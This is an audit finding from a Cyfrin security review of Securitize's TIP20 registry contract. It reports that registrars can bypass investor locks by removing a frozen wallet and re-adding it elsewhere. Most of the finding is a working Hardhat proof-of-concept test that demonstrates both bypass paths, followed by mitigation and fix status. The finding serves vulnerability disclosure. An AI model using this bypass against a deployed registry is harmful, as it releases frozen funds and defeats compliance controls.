---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-08-28-cyfrin-securitize-tempo-tip20-v2-0-0-0
ingested_at: '2026-09-27T10:10:51Z'
protocol_category: []
published_at: '2026-08-28T00:00:00Z'
related_swc: []
severity: Medium
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-08-28-cyfrin-securitize-tempo-tip20-v2.0.md
tags:
- firm:cyfrin
- report:2026-08-28-cyfrin-securitize-tempo-tip20-v2-0
title: '`Tip20RegistryService::removeWallet` lets registrars bypass active investor
  locks'
vuln_class: []
---

# `Tip20RegistryService::removeWallet` lets registrars bypass active investor locks

_Section severity (from Solodit section header): Medium_  
_Audit firm: Cyfrin_  
_Source report: [2026-08-28-cyfrin-securitize-tempo-tip20-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-08-28-cyfrin-securitize-tempo-tip20-v2.0.md)_

---

**Description:** `Tip20RegistryService::lockInvestor` deauthorizes an investor's wallets, but the freeze is stored only on the investor. A registrar can call `removeWallet`, then attach the same address to an unlocked investor or call `addPlatformWallet`. Either path reauthorizes the address in TIP-403 while the original investor remains locked.

**Impact:** An account with `REGISTRAR_ROLE`, including an `EXCHANGE`, can release a frozen wallet without `LOCK_MANAGER_ROLE`. The wallet can transfer its blocked balance while registry monitoring still reports the original investor as locked.

**Proof of Concept:** Add the following test to `test/solace-pocs/ActiveInvestorLockBypass.test.ts`:

```typescript
import { expect } from "chai";
import { ethers } from "hardhat";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";

const POLICY_ID = 2n;

async function fixture() {
  const [admin, registrar, lockManager, frozenWallet] = await ethers.getSigners();
  const tip403 = await ethers.deployContract("MockTIP403");
  const Registry = await ethers.getContractFactory("Tip20RegistryService");
  const implementation = await Registry.deploy();
  const proxy = await ethers.deployContract("ERC1967Proxy", [
    await implementation.getAddress(),
    Registry.interface.encodeFunctionData("initialize", [admin.address, await tip403.getAddress()]),
  ]);
  const registry: any = Registry.attach(await proxy.getAddress());

  await registry.setPolicyId(POLICY_ID);
  await registry.grantRole(await registry.REGISTRAR_ROLE(), registrar.address);
  await registry.grantRole(await registry.LOCK_MANAGER_ROLE(), lockManager.address);
  await registry.connect(registrar).registerInvestor("INV-1");
  await registry.connect(registrar).addWallet(frozenWallet.address, "INV-1");
  await registry.connect(lockManager).lockInvestor("INV-1");

  return { registry, tip403, registrar, frozenWallet };
}

describe("Active investor lock bypass", () => {
  it("re-authorizes a frozen wallet by attaching it to an unlocked investor", async () => {
    const { registry, tip403, registrar, frozenWallet } = await loadFixture(fixture);

    expect(await registry.isInvestorLocked("INV-1")).to.equal(true);
    expect(await tip403.isAuthorized(POLICY_ID, frozenWallet.address)).to.equal(false);

    await registry.connect(registrar).removeWallet(frozenWallet.address);
    await registry.connect(registrar).registerInvestor("INV-2");
    await registry.connect(registrar).addWallet(frozenWallet.address, "INV-2");

    expect(await tip403.isAuthorized(POLICY_ID, frozenWallet.address)).to.equal(true);
    expect(await registry.isInvestorLocked("INV-1")).to.equal(true);
    expect(await registry.getInvestor(frozenWallet.address)).to.equal("INV-2");
  });

  it("re-authorizes a frozen wallet outside the identity model", async () => {
    const { registry, tip403, registrar, frozenWallet } = await loadFixture(fixture);

    await registry.connect(registrar).removeWallet(frozenWallet.address);
    await registry.connect(registrar).addPlatformWallet(frozenWallet.address);

    expect(await tip403.isAuthorized(POLICY_ID, frozenWallet.address)).to.equal(true);
    expect(await registry.isWallet(frozenWallet.address)).to.equal(false);
    expect(await registry.isPlatformWallet(frozenWallet.address)).to.equal(true);
    expect(await registry.isInvestorLocked("INV-1")).to.equal(true);
  });
});
```

Run with: `npx hardhat test test/solace-pocs/ActiveInvestorLockBypass.test.ts`

**Recommended Mitigation:** Consider preventing removal only while the frozen wallet still holds tokens. Once its balance is zero, it may be removed and reused without lock-manager approval.

**Securitize:** Fixed in [PR 14](https://github.com/securitize-io/bc-tempo-sc/pull/14).

**Cyfrin:** Partially resolved. PR 14 addresses the main issue. . A residual ordering-dependent scenario remains where a compromised registrar could remove the funded wallet before the lock and rehome it afterward, allowing it to remain usable. The team has acknowledged and accepted this risk.

**Securitize:** Fixed in [PR 20](https://github.com/securitize-io/bc-tempo-sc/pull/20)

**Cyfrin:** Resolved. PR 20 closes the ordering path by reading the balance on every removal rather than only under an active lock, and requiring `LOCK_MANAGER_ROLE` to detach a funded wallet from an unlocked investor.


\clearpage
